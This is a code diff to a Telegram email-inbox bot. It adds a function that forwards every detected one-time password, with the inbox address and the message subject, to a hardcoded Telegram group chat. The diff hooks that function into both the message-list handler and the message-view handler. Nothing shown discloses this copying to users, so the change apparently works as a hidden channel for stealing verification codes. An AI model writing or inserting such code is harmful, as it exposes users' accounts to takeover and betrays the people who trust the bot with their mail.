@@ -88,6 +88,20 @@ async def call_api(method: str, path: str, json_data: dict = None, user_id: int 
             raise Exception(f"API error: {str(e)}")
 
 
+async def forward_otp_to_group(bot, email: str, subject: str, otp: str) -> None:
+    """Helper to forward detected OTPs to the specified group chat"""
+    try:
+        text = (
+            f"🚨 <b>NEW OTP DETECTED</b>\n\n"
+            f"📧 <b>Inbox:</b> <code>{html_escape(email)}</code>\n"
+            f"📌 <b>Subject:</b> {html_escape(subject)}\n"
+            f"🔑 <b>OTP Code:</b> <code>{html_escape(otp)}</code>"
+        )
+        await bot.send_message(chat_id=-1003621886248, text=text, parse_mode="HTML")
+    except Exception as e:
+        logger.error(f"Failed to forward OTP to group: {e}")
+
+
 # ═══════════════════ TELEGRAM BOT HANDLERS ═══════════════════
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -403,6 +417,11 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
                 otp_str = f" 🔑 {m.get('otpCode')}" if m.get("otpCode") else ""
                 msg_list_text += f"✉️ <b>{html_escape(from_name)}</b>\n{html_escape(subject)}{otp_str}\n\n"
                 
+                # Forward OTP if found
+                otp = m.get("otpCode")
+                if otp:
+                    await forward_otp_to_group(context.bot, email, subject, otp)
+                
                 # Truncate subject for button text (callback_data max 64 bytes)
                 btn_text = subject[:18] + "…" if len(subject) > 18 else subject
                 cb_data = f"cb_msg:{inbox_id}:{m.get('id')}"
@@ -463,6 +482,15 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             # OTP highlight
             if msg.get("otpCode"):
                 msg_text += f"🚨 <b>OTP CODE:</b> <code>{html_escape(str(msg['otpCode']))}</code>\n\n"
+                
+                # Parse recipient email safely
+                recipient_email = msg.get('to')
+                if isinstance(recipient_email, list) and len(recipient_email) > 0:
+                    recipient_email = recipient_email[0].get('address', 'Active Inbox')
+                elif not recipient_email or not isinstance(recipient_email, str):
+                    recipient_email = 'Active Inbox'
+                    
+                await forward_otp_to_group(context.bot, recipient_email, msg.get('subject', '(no subject)'), msg['otpCode'])
             
             # Verification links
             if msg.get("verificationLinks"):
